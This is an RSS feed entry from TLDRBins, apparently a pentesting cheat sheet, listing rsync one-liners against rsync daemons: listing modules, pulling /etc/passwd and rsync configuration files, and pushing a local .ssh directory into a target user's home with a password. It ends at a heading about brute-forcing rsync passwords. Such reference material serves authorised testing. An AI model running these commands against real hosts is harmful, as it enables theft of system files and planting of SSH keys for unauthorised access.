channel.title: Rsync on TLDRBins
channel.description: Recent content in Rsync on TLDRBins

item.title: rsync
item.description: General # List directory ('/') rsync --list-only -a rsync://<TARGET>/ # List directory ('/') with ipv6 rsync --list-only -a rsync://[<TARGET_IPV6>]:8730/ # List a file rsync --list-only -a rsync://<TARGET>/etc/passwd # List files (wildcard) rsync --list-only -a rsync://<TARGET>/etc/rsync* # Get a file rsync -a rsync://<TARGET>/etc/passwd . # Get files (wildcard) rsync -a rsync://<TARGET>/etc/rsync* . # Copy files recusively to remote (With Creds) export RSYNC_PASSWORD='<PASSWORD>'; rsync -aR .ssh/ rsync://<USER>@<TARGET>/home_user/ Bruteforce rsync Password # Get user from /etc/passwd, Get module from /etc/rsyncrsyncd.
